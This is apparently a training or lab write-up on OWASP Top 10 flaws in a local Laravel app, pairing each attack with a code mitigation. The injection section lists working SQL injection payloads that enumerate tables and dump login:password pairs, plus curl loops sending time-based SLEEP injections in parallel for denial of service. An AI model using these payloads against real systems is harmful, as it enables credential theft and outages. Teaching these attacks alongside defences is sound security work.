# Owasp Top 10 hacks and mitigations

## 1. Broken Access Control

### Hack

- Accessing other user profile changing id
- Edit other user's article
- Accessing admin dashboard 

### Mitigation
- Create a generic route avoinding the use of user id parameter in query\
Web.php
```
//Route::get('/users/{id}',[UserController::class,'show'])->name('profile');
Route::get('/profile',[UserController::class,'profile'])->name('profile');
```
UserController
```
// UNSECURE
public function show($id)
{
    $user = User::findOrFail($id);

    return view('auth.profile',compact('user'));
}

// SECURE
public function profile(){
    if(!$user = Auth::user())
    return response()->json(['message' => 'Forbidden Operation'], 403);
    
    return view('auth.profile',compact('user'));
}
```
- Create a middleware for the route group or a policy/gate system for article actions and admin

```
public function handle(Request $request, Closure $next): Response
    {
        if(!$request->user()->isAdmin())
            return redirect()->route('profile')->with('errors','Not authorized');
        return $next($request);
        
    }
```
## 2. Cryptographic Failures

### Hack
- Update profile picture, if the same file (same md5 hash) skip it. Load the 2 different images that have the same hash (plane and ship). System will believe that is the same image, skipping it

### Mitigation
- Use sha256 instead of md5\
UserController
```
// UNSECURE with md5
// $newImageHash = md5_file($newImage);

// SECURE with sha56
$newImageHash = hash_file('sha256', $newImage);

```

### Additional checks
- In confing/session.php
'secure' => true,
'http_only' => true,

## 3. Injection
### Hack
- Search using searchbar, trying to use sql sintax in order to inject sql commands\
For example:
```
'
'#
quas'order by 10#

quas'order by 7#

quas%'union select 1,user(),3,4,5,6,7#

quas%'union select 1,database(),3,4,5,6,7#

quas%'union select 1,(select GROUP_CONCAT(table_name,'\n') from information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7-- -

quas%'union select 1,(select GROUP_CONCAT(column_name,'\n') from information_schema.columns where table_name='users' and table_schema='bwapp'),3,4,5,6,7-- -

quas%' union select 1,(select GROUP_CONCAT(login,":",password,"\n") from users),3,4,5,6,7-- -

quas%' union select 1,(select GROUP_CONCAT(login,":",password,"\n") from DBNAME.users),3,4,5,6,7-- -

quas%' UNION SELECT 1, SLEEP(10), 3, 4, 5, 6, 7-- -;

laravel_session=eyJpdiI6Inl5WnlJdUhOVy9sUDhIZW0vd1dPWlE9PSIsInZhbHVlIjoiWi83VzF0Uk5oRFB2VlI4T0ttMnJDd1A4MDBtOFVPdWVpU2tETmRxbGc0Mlg1d1NlWWRwemV0Z2g2am1PcDZQSnY2MTlxTkV1cEYzZnhhdy9VRUQ2QXR4NkRIdjREMk1vTE9pUVlYZGo3SSszMDdsdUR5MzZrTFJMMGFDQ3NuVG8iLCJtYWMiOiIwYjZmOTc0ZDFhNzcyOTQyNzIwYzQ4ZDIxYTJlOTI4ZDVhMGY1NjE0NmFlNzZlYzQxYjdlM2IwZjlkNDc0OTNiIiwidGFnIjoiIn0%3D

for i in {1..2}
do
  # Esegui il comando curl con la query di SQL injection
  curl "http://localhost:8000/articles/search?search=quas%25%27%20UNION%20SELECT%201,%20SLEEP(10),%203,%204,%205,%206,%207--%20-"
  echo "Request $i sent"
done

curl --parallel --parallel-immediate --parallel-max 5 http://localhost:8000/articles/search?search=quas%25%27%20UNION%20SELECT%201,%20SLEEP(10),%203,%204,%205,%206,%207--%20-

SESSION_COOKIE="laravel_session=eyJpdiI6IlV2VHdQM1lwWm9QYjBFWWZkWWlNL1E9PSIsInZhbHVlIjoicERmUXlNcHNqNCtFYUhLNmJXdTRGZlp4TjhXSWJ1UWtJS25HVG51b2FpQnZXOCtlZ1FSZm83NXVGSzExNW5xSUc1N1o3REpSQ2cvTWFJZ050NVNPRWZrQnFuN01NQnB0eGRZdUEzdWcwdUZ0YmNxQ2Jwa1BOb0RFWlgycW9NYmMiLCJtYWMiOiIwOWYyOGRlY2VjNjU3MTA0NmU1ZDlhYzMzZWY4ZjYyN2I2YjJiNzIwNmI3OGE5NzdjYjMzMDNjYjVmN2VkZDg0IiwidGFnIjoiIn0="

# Loop per eseguire il comando curl due volte con il cookie di sessione
for i in {1..2}
do
  curl -H "Cookie: $SESSION_COOKIE" "http://localhost:8000/articles/search?search=quas%25%27%20UNION%20SELECT%201,%20SLEEP(10),%203,%204,%205,%206,%207--%20-"
  echo "Request $i sent"
done

```
### Mitigation
- Don't use raw query  
ArticleController
```
// UNSECURE
//$articles = Article::whereRaw("title like '%{$request->search}%'")->get();

// SECURE
$articles = Article::where('title', 'LIKE', "%{$request->search}%")
                    ->orWhere('content', 'LIKE', "%{$request->search}%")
->get();

```

### check
- In confing/session.php
'secure' => true,
'http_only' => true,

## 4. Insecure Design
This is a generic category, regarding all the possible design flaws that can occur.
Let's consider the comment functionality. 
### Hack
Write a huge number of comments in a short time can cause a DoS due to the memory outage
Use comments_dos.sh script to trigger multiple requests 

### Mitigation
Limit the max number of comment for a given time (5 per minute) and block the suspicious ip.

Create a middleware
```
php artisan make:middleware BlockSuspiciousIPs
```

Implement middleware
```
<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Session;
use Symfony\Component\HttpFoundation\Response;

class BlockSuspiciousIPs
{
    protected $maxAttempts = 5;
    protected $decayMinutes = 1;
    protected $blockMinutes = 1;

    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle($request, Closure $next)
    {
        $ip = $request->ip();
        $key = $this->throttleKey($ip);
        
        if (Cache::has($key . ':blocked')) {
            Session::flash('errors', "Your IP has been blocked for $this->blockMinutes minute(s) due to suspicious activity.");
            return redirect()->back();
            // return response('Your IP has been blocked due to suspicious activity.', Response::HTTP_TOO_MANY_REQUESTS);
        }

        if (Cache::has($key)) {
            $attempts = Cache::increment($key);
            if ($attempts > $this->maxAttempts) {
                Cache::put($key . ':blocked', true, $this->blockMinutes * 60);
                Log::warning("IP $ip has been blocked for $this->blockMinutes minute(s) due to too many requests.");
                Session::flash('errors', "Your IP has been blocked for $this->blockMinutes minute(s) due to suspicious activity.");
                return redirect()->back();
                //return response('Your IP has been blocked due to suspicious activity.', Response::HTTP_TOO_MANY_REQUESTS);
            }
        } else {
            Cache::put($key, 1, $this->decayMinutes * 60);
        }

        return $next($request);
    }

    protected function throttleKey($ip)
    {
        return 'throttle:' . sha1($ip);
    }
    
    
}

```
Register middleware
```
protected $middlewareAliases = [
        'auth' => \App\Http\Middleware\Authenticate::class,
        ...
        'block.suspicious' => \App\Http\Middleware\BlockSuspiciousIPs::class,
    ];
```



Other mitigations:
- use captchas (reCaptcha)

## 5. Security Misconfiguration
It's another generic category.
For example:
- sensitive information about errors are displayed
- security headers not set
- 
### Hack


### Mitigation


## 6. Vulnerable and Outdated components

### Hack


### Mitigation